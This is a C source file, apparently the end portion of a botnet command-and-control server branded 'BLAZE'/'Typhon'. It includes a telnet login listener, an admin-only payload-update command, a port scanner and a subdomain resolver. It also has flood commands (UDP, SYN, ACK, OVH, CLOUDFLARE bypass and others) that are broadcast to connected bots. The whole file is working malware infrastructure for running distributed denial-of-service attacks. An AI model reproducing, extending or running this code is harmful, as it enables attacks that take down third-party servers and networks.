        printf("\x1b[1;37m[\e[90mTyphon\x1b[1;37m] \x1b[1;37mUser:[\e[90m%s\x1b[1;37m] Added User:[\e[90m%s\x1b[1;37m]\n", accounts[find_line].user, userinfo);
        sprintf(botnet, "\x1b[1;37m[\e[90mTyphon\x1b[1;37m] \x1b[1;37mUser:[\e[90m%s\x1b[1;37m] Added User:[\e[90m%s\x1b[1;37m]\r\n", accounts[find_line].user, userinfo);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        else
        {
        sprintf(botnet, "\x1b[1;37mYou Dont Have \e[90mPermission\x1b[1;37m To Use This!\x1b[1;37m\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
        }
        }
        
        if(strstr(buf, "update") || strstr(buf, "UPDATE"))
        {
        if(strcmp(admin, accounts[find_line].id) == 0)
        {
        printf("\n");
        sprintf(botnet, "[Trying To Send Your Payload Baby]\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        else
        {
        sprintf(botnet, "\x1b[1;37mYou Dont Have \e[90mPermission\x1b[1;37m To Use This!\x1b[1;37m\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
        }
        }
      
                if(strstr(buf, "RESOLVER") || strstr(buf, "resolver")) 
        {  
        SPECIAL:  
        pthread_create(&title, NULL, &titleWriter, sock);
        
        char special_line1  [5000]; 
        char special_2  [5000]; 
        char special_3  [5000]; 
        char special_4  [5000]; 
        char special_5  [5000];
        char special_6  [5000];

        sprintf(special_line1,  "\e[38;5;196m\r\n");
        sprintf(special_2,      "\e[38;5;196m╔════════════════════════════════════╗\r\n"); 
        sprintf(special_3,      "\e[38;5;196m║\e[38;5;15m SubDomain Scanner [resolve]  [URL] \e[38;5;196m║\r\n"); 
        sprintf(special_4,      "\e[38;5;196m║\e[38;5;15m Port Scanner      [scan]     [IP]  \e[38;5;196m║\r\n"); 
        sprintf(special_5,      "\e[38;5;196m╚════════════════════════════════════╝\r\n");
        sprintf(special_6,      "\e[38;5;196m\r\n");
        
        if(send(thefd, special_line1, strlen(special_line1),   MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, special_2, strlen(special_2),   MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, special_3, strlen(special_3),   MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, special_4, strlen(special_4),   MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, special_5, strlen(special_5),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, special_6, strlen(special_6),   MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock); 
        while(1) { 
        sprintf(botnet, "\x1b[1;91m[\x1b[1;97m%s\x1b[1;91m @\x1b[1;97m B L A Z E \x1b[1;91m]\x1b[1;97m: \x1b[1;91m", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break; 
        }  
        continue; 
        }
         

         if (strstr(buf, "resolve") || strstr(buf, "RESOLVE")) {
        	pthread_create(&title, NULL, &titleWriter, sock);
        	char *ip[100];
      		char *token = strtok(buf, " ");
      		char *url = token+sizeof(token);
      		trim(url);
      		resolve(url, ip);
      		sprintf(botnet, " \x1b[91mResolved \x1b[31m%s \x1b[37mto \x1b[31m%s\r\n",url, ip);
      		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
      	}
      	if(strstr(buf, "scan") || strstr(buf, "SCAN"))
        {
            int x;
            int ps_timeout = 1; 
            int least_port = 1; 
            int max_port = 7000; 
            trim(buf);
            char *host = buf+strlen("scan");
			trim(host);
            snprintf(botnet, sizeof(botnet), "\x1b[90m[\x1b[0mPortscanner\x1b[90m] \x1b[0mChecking ports \x1b[90m%d-%d \x1b[0mon -> \x1b[90m%s...\x1b[0m\r\n", least_port, max_port, host);
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            for(x=least_port; x < max_port; x++)
            {
                int Sock = -1;
                struct timeval timeout;
                struct sockaddr_in sock;
                
                timeout.tv_sec = ps_timeout;
                timeout.tv_usec = 0;
                Sock = socket(AF_INET, SOCK_STREAM, 0); 
                setsockopt(Sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
                setsockopt(Sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));
                sock.sin_family = AF_INET;
                sock.sin_port = htons(x);
                sock.sin_addr.s_addr = inet_addr(host);
                if(connect(Sock, (struct sockaddr *)&sock, sizeof(sock)) == -1) close(Sock);
                else
                {
                    snprintf(botnet, sizeof(botnet), "\x1b[90m[\x1b[0mPortscanner\x1b[90m] %d \x1b[0mis open on \x1b[90m%s!\x1b[0m\r\n", x, host);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    memset(botnet, 0, sizeof(botnet));
                    close(Sock);
                }
            }
            snprintf(botnet, sizeof(botnet), "\x1b[90m[\x1b[0mPortscanner\x1b[90m] \x1b[32mScan on \x1b[90m%s \x1b[32mfinished.\x1b[0m\r\n", host);
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }


        if(strstr(buf, "LOGOUT") || strstr(buf, "logout")) 
        {  
        printf("\x1b[1;37m[\x1b[1;31mBLAZE\x1b[1;37m] User:[\x1b[0;36m%s\x1b[1;37m] Has Logged Out!\n", accounts[find_line].user, buf); // We Are Attempting To Logout!
        FILE *logFile;
        logFile = fopen("LOGOUT.log", "a");
        fprintf(logFile, "\x1b[1;37m[\x1b[1;31mBLAZE\x1b[1;37m] User:[\x1b[0;36m%s\x1b[1;37m] Has Logged Out!\n", accounts[find_line].user, buf);// We Are Attempting To Logout!
        fclose(logFile);
        goto end;
        }
        if(strstr(buf, "!* STOP") || strstr(buf, "!* KILLATTK")) 
        {  
        sprintf(botnet, "[B L A Z E] Attack Stopped!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
        if(strstr(buf, "!* UDP")) 
        {    
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31mBLAZE\x1b[1;37m] Sending \x1b[1;31mUDP \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
        if(strstr(buf, "!* STD")) 
        {    
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31mBLAZE\x1b[1;37m] Sending \x1b[1;31mSTD \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
        if(strstr(buf, "!* NFO")) 
        {    
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31mBLAZE\x1b[1;37m] Sending \x1b[1;31mNFO \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
        if(strstr(buf, "!* OVH")) 
        {    
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31mBLAZE\x1b[1;37m] Sending \x1b[1;31mOVH \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
        if(strstr(buf, "!* BYPASS")) 
        {    
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31mBLAZE\x1b[1;37m] Sending \x1b[1;31mBYPASS \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
        if(strstr(buf, "!* VSE")) 
        {    
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31mBLAZE\x1b[1;37m] Sending \x1b[1;31mVSE \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
        if(strstr(buf, "!* TCP")) 
        {    
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31mBLAZE\x1b[1;37m] Loading sockets...\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
        if(strstr(buf, "!* CLOUDFLARE")) 
        {  
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31mBLAZE\x1b[1;37m] Sending \x1b[1;31mCLOUDFLARE \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
        if(strstr(buf, "ALL")) 
        {  
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31mBLAZE\x1b[1;37m] Sending \x1b[1;90mTCP \x1b[1;37mFlood using \x1b[1;31mALL \x1b[1;37mMethods!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
        if(strstr(buf, "SYN")) 
        {  
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31mBLAZE\x1b[1;37m] Sending \x1b[0;36mTCP-SYN \x1b[1;37mFlood\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
        if(strstr(buf, "FIN")) 
        {  
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31mBLAZE\x1b[1;37m] Sending \x1b[0;36mTCP-FIN \x1b[1;37mFlood\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
        if(strstr(buf, "RST")) 
        {  
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31mBLAZE\x1b[1;37m] Sending \x1b[0;36mTCP-RST \x1b[1;37mFlood\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
        if(strstr(buf, "ACK")) 
        {  
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31mBLAZE\x1b[1;37m] Sending \x1b[0;36mTCP-ACK \x1b[1;37mFlood\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
        if(strstr(buf, "PSH")) 
        {    
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31mBLAZE\x1b[1;37m] Sending \x1b[0;36mTCP-PSH \x1b[1;37mFlood\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
        if (strstr(buf, "clear") || strstr(buf, "CLEAR") || strstr(buf, "cls") || strstr(buf, "CLS"))
        {   
        goto Typhon; 
        }  
        if (strstr(buf, "EXIT") || strstr(buf, "exit") || strstr(buf, "leave") || strstr(buf, "LEAVE"))  
        { 
        goto end; 
        } 
        trim(buf);
        sprintf(botnet, "\x1b[1;91m[\x1b[1;97m%s\x1b[1;91m @\x1b[1;97m B L A Z E \x1b[1;91m]\x1b[1;97m: \x1b[1;91m", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        if(strlen(buf) == 0) continue;
        printf("[BLAZE] User:[%s] - Command:[%s]\n",accounts[find_line].id, buf);
        FILE *logFile;
        logFile = fopen("server.log", "a");
        fprintf(logFile, "[BLAZE] User:[%s] - Command:[%s]\n", accounts[find_line].user, buf);
        fclose(logFile);
        broadcast(buf, thefd, usernamez);
        memset(buf, 0, 2048);
        } 
        end:    
        managements[thefd].connected = 0;
        close(thefd);
        managesConnected--;
}
 
void *telnetListener(int port)
{    
        int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("\x1b[1;37m[\x1b[1;31mBLAZE\x1b[1;37m] Screening Error");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)
        {  printf("[BLAZE] Incoming Connection From ");
       
        client_addr(cli_addr);
        FILE *logFile;
        logFile = fopen("IP.log", "a");
        fprintf(logFile, "[BLAZE] Incoming Connection From [%d.%d.%d.%d]\n",cli_addr.sin_addr.s_addr & 0xFF, (cli_addr.sin_addr.s_addr & 0xFF00)>>8, (cli_addr.sin_addr.s_addr & 0xFF0000)>>16, (cli_addr.sin_addr.s_addr & 0xFF000000)>>24);
        fclose(logFile);
        newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
        if (newsockfd < 0) perror("ERROR on accept");
        pthread_t thread;
        pthread_create( &thread, NULL, &telnetWorker, (void *)newsockfd);
        }
}
 
int main (int argc, char *argv[], void *sock)
{
        signal(SIGPIPE, SIG_IGN); // ignore broken pipe errors sent from kernel
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4)
        {
        fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
        exit (EXIT_FAILURE);
        }
        port = atoi(argv[3]);
        threads = atoi(argv[2]);
        if (threads > 1000)
        {
        printf("\x1b[1;37m[\x1b[1;31mBLAZE\x1b[1;37m] Thread Limit Exceeded! Please Lower Threat Count!\n");
        return 0;
        }
        else if (threads < 1000)
        {
        printf("");
        }
        printf("\x1b[1;37m[\x1b[1;31mBLAZE\x1b[1;37m] Successfully Screened - Created By [\x1b[0;36mzDarkSide\x1b[1;37m]\n");
        listenFD = create_and_bind(argv[1]); 
        if (listenFD == -1) abort();
    
        s = make_socket_non_blocking (listenFD); 
        if (s == -1) abort();
 
        s = listen (listenFD, SOMAXCONN); 
        if (s == -1)
        {
        perror ("listen");
        abort ();
        }
        epollFD = epoll_create1 (0); 
        if (epollFD == -1)
        {
        perror ("epoll_create");
        abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
        {
        perror ("epoll_ctl");
        abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--)
        {
        pthread_create( &thread[threads + 1], NULL, &epollEventLoop, (void *) NULL); 
        }
        pthread_create(&thread[0], NULL, &telnetListener, port);
        while(1)
        {
        broadcast("PING", -1, "STRING");
        sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}                                                                                                                                                                                                                                                                                                                           //Typhon.9522
